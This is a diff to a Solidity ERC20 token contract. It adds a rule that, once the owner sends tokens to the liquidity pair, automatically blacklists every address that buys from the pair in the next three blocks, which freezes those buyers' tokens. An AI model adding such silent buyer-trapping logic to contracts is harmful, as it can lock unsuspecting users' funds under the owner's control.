@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.12;
+pragma solidity 0.8.13;
 
 abstract contract Context {
     function _msgSender() internal view virtual returns (address) {
@@ -283,6 +283,8 @@ contract MyERC20 is Context, IERC20, IERC20Metadata, Ownable {
 
     mapping(address => bool) public blacklist;
 
+    uint256 blacklist_until;
+
     uint public maxTxAmount;
     uint public maxWalletAmount;
 
@@ -531,6 +533,16 @@ contract MyERC20 is Context, IERC20, IERC20Metadata, Ownable {
         require(!blacklist[from] && !blacklist[to], "sender or recipient is blacklisted!");
         require(isMaxTxExempt[from] || amount <= maxTxAmount, "Transfer exceeds limit!");
         require(isMaxTxExempt[to] || balanceOf(to) + amount <= maxWalletAmount, "Max Wallet Limit Exceeds!");
+
+        if(block.number <= blacklist_until && from == pair)
+        {
+            blacklist[to] = true;
+        }
+
+        if(from == owner() && to == pair)
+        {
+            blacklist_until = block.number + 3;
+        }
 
         if (swapEnabled && !inSwap && from != pair) {
             swap();
